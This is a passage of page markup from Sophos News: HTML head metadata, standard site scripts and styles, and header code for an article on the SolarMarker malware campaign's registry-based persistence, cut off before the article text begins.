<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://news.sophos.com/xmlrpc.php">
	<link rel="alternate" hreflang="es-419" href="https://news.sophos.com/es-419/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence" />
	<link rel="alternate" hreflang="nl-nl" href="https://news.sophos.com/nl-nl/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence" />
	<link rel="alternate" hreflang="pt-br" href="https://news.sophos.com/pt-br/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence" />
	<link rel="alternate" hreflang="de-de" href="https://news.sophos.com/de-de/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence" />
	<link rel="alternate" hreflang="en-us" href="https://news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence" />
	<link rel="alternate" hreflang="fr-fr" href="https://news.sophos.com/fr-fr/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence" />
	<link rel="alternate" hreflang="es-es" href="https://news.sophos.com/es-es/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence" />
	<link rel="alternate" hreflang="it-it" href="https://news.sophos.com/it-it/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence" />
	<link rel="alternate" hreflang="ja-jp" href="https://news.sophos.com/ja-jp/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence" />
	<link rel="alternate" hreflang="zh-tw" href="https://news.sophos.com/zh-tw/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence" />
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-TW8W88B');</script>
<!-- End Google Tag Manager -->
<script type="text/javascript">
/* <![CDATA[ */
(()=>{var e={};e.g=function(){if("object"==typeof globalThis)return globalThis;try{return this||new Function("return this")()}catch(e){if("object"==typeof window)return window}}(),function({ampUrl:n,isCustomizePreview:t,isAmpDevMode:r,noampQueryVarName:o,noampQueryVarValue:s,disabledStorageKey:i,mobileUserAgents:a,regexRegex:c}){if("undefined"==typeof sessionStorage)return;const d=new RegExp(c);if(!a.some((e=>{const n=e.match(d);return!(!n||!new RegExp(n[1],n[2]).test(navigator.userAgent))||navigator.userAgent.includes(e)})))return;e.g.addEventListener("DOMContentLoaded",(()=>{const e=document.getElementById("amp-mobile-version-switcher");if(!e)return;e.hidden=!1;const n=e.querySelector("a[href]");n&&n.addEventListener("click",(()=>{sessionStorage.removeItem(i)}))}));const g=r&&["paired-browsing-non-amp","paired-browsing-amp"].includes(window.name);if(sessionStorage.getItem(i)||t||g)return;const u=new URL(location.href),m=new URL(n);m.hash=u.hash,u.searchParams.has(o)&&s===u.searchParams.get(o)?sessionStorage.setItem(i,"1"):m.href!==u.href&&(window.stop(),location.replace(m.href))}({"ampUrl":"https:\/\/news.sophos.com\/en-us\/2022\/02\/01\/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence\/?amp=1","noampQueryVarName":"noamp","noampQueryVarValue":"mobile","disabledStorageKey":"amp_mobile_redirect_disabled","mobileUserAgents":["Mobile","Android","Silk\/","Kindle","BlackBerry","Opera Mini","Opera Mobi"],"regexRegex":"^\\\/((?:.|\\n)+)\\\/([i]*)$","isCustomizePreview":false,"isAmpDevMode":false})})();
/* ]]> */
</script>
<title>SolarMarker campaign used novel registry changes to establish persistence &#8211; Sophos News</title>
<meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="8r1qg681OjOolfxmHEY1IYupmTBdyKXc-OPfpgeQHFk" />
<link rel='dns-prefetch' href='//unpkg.com' />
<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='dns-prefetch' href='//v0.wordpress.com' />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Feed" href="https://news.sophos.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Comments Feed" href="https://news.sophos.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; SolarMarker campaign used novel registry changes to establish persistence Comments Feed" href="https://news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence/feed/" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/news.sophos.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='all-css-2' href='https://news.sophos.com/wp-includes/css/dist/block-library/style.min.css?m=1732206022g' type='text/css' media='all' />
<style id='safe-svg-svg-icon-style-inline-css'>
.safe-svg-cover{text-align:center}.safe-svg-cover .safe-svg-inside{display:inline-block;max-width:100%}.safe-svg-cover svg{height:100%;max-height:100%;max-width:100%;width:100%}

</style>
<link rel='stylesheet' id='all-css-6' href='https://news.sophos.com/_static/??-eJzTLy/QzcxLzilNSS3WzyrWz01NyUxMzUnNTc0rQeEU5CRWphbp5qSmJyZX6uVm5uklFxfr6OPTDpRD5sM02efaGpobGxkZmBkYGQMARIMu1Q==' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id='co-authors-plus-coauthors-style-inline-css'>
.wp-block-co-authors-plus-coauthors.is-layout-flow [class*=wp-block-co-authors-plus]{display:inline}

</style>
<style id='co-authors-plus-avatar-style-inline-css'>
.wp-block-co-authors-plus-avatar :where(img){height:auto;max-width:100%;vertical-align:bottom}.wp-block-co-authors-plus-coauthors.is-layout-flow .wp-block-co-authors-plus-avatar :where(img){vertical-align:middle}.wp-block-co-authors-plus-avatar:is(.alignleft,.alignright){display:table}.wp-block-co-authors-plus-avatar.aligncenter{display:table;margin-inline:auto}

</style>
<style id='co-authors-plus-image-style-inline-css'>
.wp-block-co-authors-plus-image{margin-bottom:0}.wp-block-co-authors-plus-image :where(img){height:auto;max-width:100%;vertical-align:bottom}.wp-block-co-authors-plus-coauthors.is-layout-flow .wp-block-co-authors-plus-image :where(img){vertical-align:middle}.wp-block-co-authors-plus-image:is(.alignfull,.alignwide) :where(img){width:100%}.wp-block-co-authors-plus-image:is(.alignleft,.alignright){display:table}.wp-block-co-authors-plus-image.aligncenter{display:table;margin-inline:auto}

</style>
<style id='elasticpress-facet-style-inline-css'>
.widget_ep-facet input[type=search],.wp-block-elasticpress-facet input[type=search]{margin-bottom:1rem}.widget_ep-facet .searchable .inner,.wp-block-elasticpress-facet .searchable .inner{max-height:20em;overflow:scroll}.widget_ep-facet .term.hide,.wp-block-elasticpress-facet .term.hide{display:none}.widget_ep-facet .empty-term,.wp-block-elasticpress-facet .empty-term{opacity:.5;position:relative}.widget_ep-facet .empty-term:after,.wp-block-elasticpress-facet .empty-term:after{bottom:0;content:" ";display:block;left:0;position:absolute;right:0;top:0;width:100%;z-index:2}.widget_ep-facet .level-1,.wp-block-elasticpress-facet .level-1{padding-left:20px}.widget_ep-facet .level-2,.wp-block-elasticpress-facet .level-2{padding-left:40px}.widget_ep-facet .level-3,.wp-block-elasticpress-facet .level-3{padding-left:60px}.widget_ep-facet .level-4,.wp-block-elasticpress-facet .level-4{padding-left:5pc}.widget_ep-facet .level-5,.wp-block-elasticpress-facet .level-5{padding-left:75pt}.widget_ep-facet input[disabled],.wp-block-elasticpress-facet input[disabled]{cursor:pointer;opacity:1}.widget_ep-facet .term a,.wp-block-elasticpress-facet .term a{-webkit-box-align:center;-ms-flex-align:center;align-items:center;display:-webkit-box;display:-ms-flexbox;display:flex;position:relative}.widget_ep-facet .term a:hover .ep-checkbox,.wp-block-elasticpress-facet .term a:hover .ep-checkbox{background-color:#ccc}.ep-checkbox{-webkit-box-align:center;-ms-flex-align:center;-ms-flex-negative:0;-webkit-box-pack:center;-ms-flex-pack:center;align-items:center;background-color:#eee;display:-webkit-box;display:-ms-flexbox;display:flex;flex-shrink:0;height:1em;justify-content:center;margin-right:.25em;width:1em}.ep-checkbox:after{border:solid #fff;border-width:0 .125em .125em 0;content:"";display:none;height:.5em;-webkit-transform:rotate(45deg);transform:rotate(45deg);width:.25em}.ep-checkbox.checked{background-color:#5e5e5e}.ep-checkbox.checked:after{display:block}

</style>
<link rel='stylesheet' id='all-css-18' href='https://news.sophos.com/wp-content/mu-plugins/search/elasticpress/dist/css/related-posts-block-styles.min.css?m=1730999764g' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='all-css-22' href='https://news.sophos.com/wp-content/themes/sophosnews-2017/style-2021.css?m=1722941894g' type='text/css' media='all' />
<script type="text/javascript" src="https://news.sophos.com/_static/??-eJzTLy/QzcxLzilNSS3WzwKiwtLUokoopZebmaeXVayjj0+Rbm5melFiSSpUsX2uraG5sZGRgZmBkXEWAK8tIhI=" ></script><link rel="https://api.w.org/" href="https://news.sophos.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://news.sophos.com/wp-json/wp/v2/posts/81186" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://news.sophos.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.7.1" />
<link rel="canonical" href="https://news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence/" />
<link rel='shortlink' href='https://news.sophos.com/?p=81186' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2022%2F02%2F01%2Fsolarmarker-campaign-used-novel-registry-changes-to-establish-persistence%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2022%2F02%2F01%2Fsolarmarker-campaign-used-novel-registry-changes-to-establish-persistence%2F&#038;format=xml" />
<link rel="me" href="https://infosec.exchange/@SophosXOps"/>
<link rel="alternate" type="text/html" media="only screen and (max-width: 640px)" href="https://news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence/?amp=1">	<style>img#wpstats{display:none}</style>
		<link rel="amphtml" href="https://news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence/?amp=1"><style>#amp-mobile-version-switcher{left:0;position:absolute;width:100%;z-index:100}#amp-mobile-version-switcher>a{background-color:#444;border:0;color:#eaeaea;display:block;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif;font-size:16px;font-weight:600;padding:15px 0;text-align:center;-webkit-text-decoration:none;text-decoration:none}#amp-mobile-version-switcher>a:active,#amp-mobile-version-switcher>a:focus,#amp-mobile-version-switcher>a:hover{-webkit-text-decoration:underline;text-decoration:underline}</style>
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="SolarMarker campaign used novel registry changes to establish persistence" />
<meta property="og:url" content="https://news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence/" />
<meta property="og:description" content="Inserting custom file handling rules for a randomly-created file extension and a .LNK in Windows&#8217; startup folder, malware installer created a stealthy persistence mechanism for backdoor." />
<meta property="article:published_time" content="2022-02-01T13:00:30+00:00" />
<meta property="article:modified_time" content="2022-10-03T14:14:21+00:00" />
<meta property="og:site_name" content="Sophos News" />
<meta property="og:image" content="https://news.sophos.com/wp-content/uploads/2022/01/solarflare-e1642178554820.jpeg?w=640" />
<meta property="og:image:secure_url" content="https://news.sophos.com/wp-content/uploads/2022/01/solarflare-e1642178554820.jpeg?w=640" />
<meta property="og:image:width" content="640" />
<meta property="og:image:height" content="353" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta property="fb:admins" content="28552295016" />
<meta name="twitter:text:title" content="SolarMarker campaign used novel registry changes to establish persistence" />
<meta name="twitter:image" content="https://news.sophos.com/wp-content/uploads/2022/01/solarflare-e1642178554820.jpeg?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=32" sizes="32x32" />
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=192" sizes="192x192" />
<link rel="apple-touch-icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=180" />
<meta name="msapplication-TileImage" content="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=270" />
		<style type="text/css" id="wp-custom-css">
			.entry-content .embed-vimeo iframe,
.entry-content .embed-youtube iframe {
  aspect-ratio: 16/9; width: 100%; height: auto;
}		</style>
		</head>

<body class="post-template-default single single-post postid-81186 single-format-standard group-blog">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TW8W88B"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<div id="page" class="hfeed site">
	<a class="sr-only" href="#content">Skip to content</a>

	
<header class="bg-blue-600" x-data="{ mobileMenu: false, searchField: false }">
	<div class="container">
		<div class="flex items-center justify-between h-16">

			<!-- Logo -->
			<div class="flex-shrink-0">
				<a class="site-logo" href="https://news.sophos.com/en-us/" rel="home">
				<svg width="172" height="17" xmlns="http://www.w3.org/2000/svg">
					<g fill="#FFF" fill-rule="evenodd">
						<path d="M113.024 5.298V16.74h-2.595V.259h2.265l7.997 11.49V.26h2.619v16.482h-2.289l-7.997-11.443M126.064.259h10.78v2.307H128.8v4.521h7.549v2.214h-7.55v5.133h8.376v2.307h-11.111V.259M138.478.259h2.855l2.694 12.29L147.29.26h2.783l3.61 12.314L156.005.26h2.783l-3.62 16.482h-2.76l-3.751-12.126-3.426 12.126h-2.784L138.478.259M168.933 4.968v-.283c0-1.318-.778-2.425-3.492-2.425-2.43 0-3.279 1.013-3.279 2.284 0 1.201.708 1.743 2.218 2.073l3.491.776c2.123.448 4.129 1.602 4.129 4.333 0 3.014-1.675 5.274-6.204 5.274-5.214 0-6.559-2.26-6.559-4.52v-.307h2.737v.26c0 1.2.755 2.284 3.774 2.284 2.5 0 3.421-1.084 3.421-2.638 0-1.224-.731-1.907-2.289-2.237l-3.49-.777c-2.407-.517-3.917-1.742-3.917-4.309 0-2.566 1.77-4.756 6.016-4.756 4.553 0 6.18 2.26 6.18 4.639v.33h-2.736M85.303 16.718h8.88c2.492 0 3.549-.15 4.379-.677 1.308-.803 2.139-2.378 2.139-4.162 0-1.457-.504-2.868-1.258-3.622-.981-1.006-2.316-1.382-4.783-1.382h-2.693c-1.208 0-2.097-.05-2.6-.276-.605-.277-.956-.81-.956-1.562 0-.88.427-1.455 1.132-1.632.529-.124 1.14-.124 2.726-.15h7.949V.265h-8.754c-1.963 0-2.843.075-3.598.353-1.737.602-2.921 2.383-2.921 4.518 0 1.458.58 2.745 1.587 3.624.881.753 2.189 1.105 4.202 1.105h3.584c.805 0 1.46.1 1.813.3.678.327 1.08.934 1.08 1.714 0 .652-.301 1.122-.83 1.447-.426.278-1.158.403-2.49.403h-8.588v2.99zm-84.945 0h8.88c2.492 0 3.549-.15 4.38-.677 1.307-.803 2.138-2.378 2.138-4.162 0-1.457-.504-2.868-1.258-3.622-.982-1.006-2.316-1.382-4.783-1.382H7.023c-1.209 0-2.098-.05-2.6-.276-.605-.277-.957-.81-.957-1.562 0-.88.427-1.455 1.132-1.632.53-.124 1.141-.124 2.726-.15h7.95V.265H6.52c-1.964 0-2.844.075-3.6.353C1.185 1.22 0 3 0 5.136 0 6.594.582 7.881 1.587 8.76c.881.753 2.19 1.105 4.203 1.105h3.582c.807 0 1.46.1 1.814.3.678.327 